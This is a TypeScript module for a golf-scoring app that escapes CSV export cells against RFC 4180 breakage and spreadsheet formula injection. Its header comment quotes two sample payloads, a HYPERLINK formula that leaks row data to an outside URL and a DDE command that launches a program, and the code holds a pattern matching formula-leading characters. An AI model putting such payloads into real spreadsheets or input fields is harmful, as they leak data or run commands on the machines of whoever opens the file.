/**
 * Writing a CSV that a spreadsheet will not execute.
 *
 * Two separate jobs, and the export had only half of the first one.
 *
 * RFC 4180 quoting decides where the cells are. The old escape tested
 * `/[",\n]/` and missed `\r`, which is enough on its own: a lone carriage
 * return inside an unquoted field ends the record early in Excel, so one
 * pasted-in name silently shifts every column after it.
 *
 * Formula injection decides whether the file is a document or a program. A
 * cell beginning `=`, `+`, `-`, `@`, tab or CR is a formula to Excel, Sheets
 * and LibreOffice alike, and quoting does NOT stop it — the quotes are
 * stripped before evaluation. `=HYPERLINK("http://…"&A1,"Click")` in a player
 * name exfiltrates the row it lands next to when the club opens the export;
 * `=cmd|'/c calc'!A0` is the DDE variant. This matters here more than in most
 * apps because a name on this export can come from the public registration
 * form, which is unauthenticated by design.
 *
 * The mitigation is a leading apostrophe, which those three all read as "this
 * cell is text". It is applied only to cells that are not plain numbers,
 * because a golf export is full of `-2` and `+1` — leading `-` and `+` are
 * to-par, not an attack, and mangling them would break every scoreboard this
 * feature exists to print.
 */

/** Cells starting with one of these are evaluated rather than displayed. */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/** A cell that is only a number — including the golf ones, `-2` and `+1`. */
const PLAIN_NUMBER = /^[+-]?(\d+\.?\d*|\.\d+)$/;

/** Quoting is required for the RFC delimiters, and for edge whitespace that a
 *  reader would otherwise trim away. */
const NEEDS_QUOTES = /[",\r\n]|^\s|\s$/;

/**
 * One cell, ready to sit between commas.
 *
 * Exported so it can be tested directly and reused by any other export — the
 * reason this defect existed at all is that the rule lived inline in a
 * component where nothing could reach it.
 */
export function csvCell(value: string | number | null | undefined): string {
  const raw = value === null || value === undefined ? "" : String(value);

  const safe =
    FORMULA_LEAD.test(raw) && !PLAIN_NUMBER.test(raw)
      ? // Not `\t` or a space: those are themselves stripped or ambiguous.
        // The apostrophe is what spreadsheets specifically read as "text".
        `'${raw}`
      : raw;

  return NEEDS_QUOTES.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
}

/**
 * Rows to a CSV document. CRLF line endings, as RFC 4180 specifies and as
 * Excel on Windows expects.
 */
export function toCsv(rows: (string | number | null | undefined)[][]): string {
  return rows.map((row) => row.map(csvCell).join(",")).join("\r\n");
}
